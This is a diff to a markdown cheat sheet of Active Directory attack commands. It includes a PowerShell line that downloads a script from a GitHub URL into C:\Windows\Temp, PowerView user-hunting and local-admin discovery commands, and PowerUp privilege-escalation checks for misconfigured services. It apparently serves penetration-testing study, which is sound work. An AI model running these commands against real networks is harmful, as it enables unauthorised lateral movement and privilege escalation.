@@ -31,6 +31,28 @@ OR If already running-
 #### download
 ```(new-object System.Net.Webclient).DownloadFile("https://raw.githubusercontent.com/conma293/mvp/main/1.ps1", "C:\Windows\Temp\1.ps1")```
 
+# Powerview
+
+#### User Hunting
+
+```Run Find-LocalAdminAccess``` - find all machines on current domain where current user has localadmin access
+```Run Find-LocalAdminAccess -CheckAccess``` - list sessions where you have access to the machine
+
+```Invoke-UserHunter``` for users/groups you want - will show all active sessions for users/users of specified groups
+```Invoke-UserHunter -GroupName "RDPUsers"```
+
+####Priv Esc
+
+Run PowerUp - are you already localadmin?
+```
+../PowerUp.ps1
+Invoke-AllChecks 
+```
+
+```Get-UnquotedService```
+```Get-ModifiableService```
+```Get-ModifiableServiceFile | select servicename, abusefeature```
+
 # Tickets
 
 NTLM == RC4
